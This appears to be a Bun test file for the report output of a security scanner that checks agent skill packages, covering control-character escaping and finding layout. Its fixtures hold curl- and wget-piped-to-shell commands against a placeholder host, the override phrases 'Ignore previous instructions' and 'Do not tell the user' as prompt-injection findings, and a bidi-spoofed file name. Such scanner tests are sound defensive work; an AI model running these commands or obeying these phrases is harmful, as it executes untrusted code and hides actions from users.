import { describe, expect, test } from "bun:test";
import type { Finding } from "../core/scan/index.ts";
import { escapeControl, renderFindings } from "./report.ts";

const ESC = "\u001B";

describe("escapeControl", () => {
  test("shows ESC, other C0 characters, and DEL as caret markers", () => {
    expect(escapeControl(`a${ESC}[31mb\u0000c\u0007d\rE\u007F`)).toBe("a^[[31mb^@c^Gd^ME^?");
  });

  test("keeps tab and newline", () => {
    expect(escapeControl("a\tb\nc")).toBe("a\tb\nc");
  });

  test("shows C1 controls and format characters as code points", () => {
    expect(escapeControl("a\u009B31mb\u0085c")).toBe("a<U+009B>31mb<U+0085>c");
    expect(escapeControl("evil\u202Etxt.sh\u200B\u{E0041}")).toBe(
      "evil<U+202E>txt.sh<U+200B><U+E0041>",
    );
  });
});

test("renderFindings renders the supplied help literally", () => {
  const findings: Finding[] = [
    {
      severity: "critical",
      confidence: "high",
      rule: "hooks",
      help: "literal help from the scanner",
      file: "SKILL.md",
      line: 4,
      detail: "PreToolUse -> ./inspect.sh",
    },
    {
      severity: "warn",
      confidence: "high",
      rule: "executable",
      help: "ships an executable",
      file: "scripts/run.sh",
      detail: "executable file",
    },
  ];

  expect(Bun.stripANSI(renderFindings("fixture", findings))).toBe(
    [
      "fixture: security scan",
      "",
      "1 critical finding",
      "  hooks: literal help from the scanner",
      "    SKILL.md:4  PreToolUse -> ./inspect.sh",
      "",
      "1 warn finding",
      "  executable: ships an executable",
      "    scripts/run.sh  executable file",
    ].join("\n"),
  );
});

test("renderFindings marks a low-confidence finding and no other", () => {
  const findings: Finding[] = [
    {
      severity: "warn",
      confidence: "low",
      rule: "prompt-injection",
      help: "asks the agent to hide actions",
      file: "SKILL.md",
      line: 5,
      detail: "Do not tell the user",
    },
    {
      severity: "warn",
      confidence: "medium",
      rule: "prompt-injection",
      help: "asks the agent to hide actions",
      file: "notes.md",
      line: 2,
      detail: "Ignore previous instructions",
    },
  ];

  expect(Bun.stripANSI(renderFindings("fixture", findings))).toBe(
    [
      "fixture: security scan",
      "",
      "2 warn findings",
      "  prompt-injection: asks the agent to hide actions",
      "    SKILL.md:5  Do not tell the user (low confidence)",
      "    notes.md:2  Ignore previous instructions",
    ].join("\n"),
  );
});

test("renderFindings keeps an accepted critical finding under critical and marks it accepted", () => {
  const curl = {
    severity: "critical",
    confidence: "high",
    rule: "curl-pipe-shell",
    help: "runs downloaded code",
    file: "setup.sh",
  } as const;
  const findings: Finding[] = [
    { ...curl, line: 2, detail: "curl https://x.invalid | sh", accepted: true },
    { ...curl, line: 5, detail: "wget -qO- https://x.invalid | bash" },
  ];

  expect(Bun.stripANSI(renderFindings("fixture", findings))).toBe(
    [
      "fixture: security scan",
      "",
      "2 critical findings",
      "  curl-pipe-shell: runs downloaded code",
      "    setup.sh:2  curl https://x.invalid | sh (accepted)",
      "    setup.sh:5  wget -qO- https://x.invalid | bash",
    ].join("\n"),
  );
});

const executableAt = (file: string, detail: string): Finding => ({
  severity: "warn",
  confidence: "high",
  rule: "executable",
  help: "ships an executable",
  file,
  detail,
});

test("renderFindings escapes control characters in file paths and aligns the escaped text", () => {
  const rendered = renderFindings("fixture", [
    executableAt(`run${ESC}[2J.sh`, "first"),
    executableAt("a\u202Eb", "second"),
  ]);

  expect(rendered).not.toContain(ESC + "[2J");
  expect(Bun.stripANSI(rendered).split("\n").slice(-2)).toEqual([
    "    run^[[2J.sh  first",
    "    a<U+202E>b   second",
  ]);
});
